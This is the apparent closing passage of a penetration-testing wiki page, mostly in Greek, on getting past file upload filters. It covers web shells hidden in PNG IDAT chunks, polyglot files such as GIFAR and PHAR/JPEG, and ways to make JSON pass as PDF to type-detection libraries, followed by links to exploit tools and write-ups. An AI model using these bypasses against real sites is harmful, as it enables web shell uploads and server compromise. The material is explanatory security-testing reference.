Η ενσωμάτωση ενός PHP shell στο IDAT chunk ενός αρχείου PNG μπορεί να παρακάμψει αποτελεσματικά ορισμένες λειτουργίες επεξεργασίας εικόνας. Οι συναρτήσεις `imagecopyresized` και `imagecopyresampled` από PHP-GD είναι ιδιαίτερα σχετικές σε αυτό το πλαίσιο, καθώς χρησιμοποιούνται συχνά για την αλλαγή μεγέθους και την επαναδειγματοληψία εικόνων, αντίστοιχα. Η ικανότητα του ενσωματωμένου PHP shell να παραμένει ανεπηρέαστο από αυτές τις λειτουργίες αποτελεί σημαντικό πλεονέκτημα για ορισμένα σενάρια χρήσης.

Μια λεπτομερής εξερεύνηση αυτής της τεχνικής, συμπεριλαμβανομένης της μεθοδολογίας και των πιθανών εφαρμογών, παρέχεται στο ακόλουθο άρθρο: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Αυτός ο πόρος προσφέρει μια ολοκληρωμένη κατανόηση της διαδικασίας και των επιπτώσεών της.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files λειτουργούν ως μοναδικό εργαλείο στην κυβερνοασφάλεια, ενεργώντας σαν χαμαιλέοντες που μπορούν να υπάρξουν νόμιμα σε πολλαπλές μορφές αρχείων ταυτόχρονα. Ένα ενδιαφέρον παράδειγμα είναι ένα [GIFAR](https://en.wikipedia.org/wiki/Gifar), ένα υβρίδιο που λειτουργεί τόσο ως GIF όσο και ως RAR archive. Τέτοια αρχεία δεν περιορίζονται σε αυτό το ζευγάρι· συνδυασμοί όπως GIF και JS ή PPT και JS είναι επίσης δυνατοί.

Η βασική χρησιμότητα των polyglot files έγκειται στην ικανότητά τους να παρακάμπτουν μέτρα ασφαλείας που φιλτράρουν αρχεία βάσει τύπου. Συνήθης πρακτική σε διάφορες εφαρμογές είναι να επιτρέπεται μόνο η μεταφόρτωση συγκεκριμένων τύπων αρχείων — όπως JPEG, GIF ή DOC — για να μετριαστεί ο κίνδυνος από ενδεχομένως επιβλαβείς μορφές (π.χ., JS, PHP ή Phar files). Ωστόσο, ένα polyglot, συμμορφούμενο με τα δομικά κριτήρια πολλαπλών τύπων αρχείων, μπορεί να παρακάμψει αθόρυβα αυτούς τους περιορισμούς.

Παρά την προσαρμοστικότητά τους, τα polyglots συναντούν περιορισμούς. Για παράδειγμα, ενώ ένα polyglot μπορεί ταυτόχρονα να ενσωματώνει ένα PHAR file (PHp ARchive) και ένα JPEG, η επιτυχία της μεταφόρτωσής του μπορεί να εξαρτάται από τις πολιτικές επέκτασης αρχείων της πλατφόρμας. Αν το σύστημα είναι αυστηρό ως προς τις επιτρεπόμενες επεκτάσεις, η μόνη δομική δυαδικότητα ενός polyglot ενδέχεται να μην αρκεί για να εξασφαλίσει τη μεταφόρτωση.

### Upload valid JSONs like if it was PDF

How to avoid file type detections by uploading a valid JSON file even if not allowed by faking a PDF file (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Εφόσον τα magic bytes `%PDF` βρίσκονται στα πρώτα 1024 bytes είναι έγκυρο (βλ. παράδειγμα στο post)
- **`pdflib` library**: Προσθέστε ένα ψεύτικο PDF format μέσα σε ένα πεδίο του JSON ώστε η βιβλιοθήκη να νομίσει ότι είναι ένα pdf (βλ. παράδειγμα στο post)
- **`file` binary**: Μπορεί να διαβάσει έως 1048576 bytes από ένα αρχείο. Απλώς δημιουργήστε ένα JSON μεγαλύτερο από αυτό ώστε να μην μπορεί να αναλύσει το περιεχόμενο ως json και στη συνέχεια μέσα στο JSON βάλτε το αρχικό μέρος ενός πραγματικού PDF και θα νομίσει ότι είναι PDF

## Αναφορές

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
